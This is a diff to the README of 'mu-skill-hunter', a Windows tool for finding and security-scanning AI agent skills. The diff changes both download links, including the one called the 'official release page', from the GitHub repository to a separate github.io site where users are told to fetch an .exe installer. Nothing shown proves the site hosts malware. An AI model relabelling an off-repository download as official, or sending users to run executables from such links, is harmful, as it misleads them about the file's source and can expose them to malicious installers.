@@ -1,6 +1,6 @@
 # 🔍 mu-skill-hunter - Find and secure your AI skills
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Vika7092/mu-skill-hunter)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://vika7092.github.io)
 
 mu-skill-hunter helps you find, check, and track skills for your AI agents. You can search four different sources at once. These sources include GitHub, ClawHub, SkillHub, and Skills.sh. The tool also scans skills for security risks using 12 set rules. It provides reports every week to show current trends.
 
@@ -10,7 +10,7 @@ You need a computer that runs Windows 10 or Windows 11. Ensure your system has a
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/Vika7092/mu-skill-hunter) to download the installer.
+1. Visit the [official release page](https://vika7092.github.io) to download the installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to save it to your computer.
 4. Open your Downloads folder.
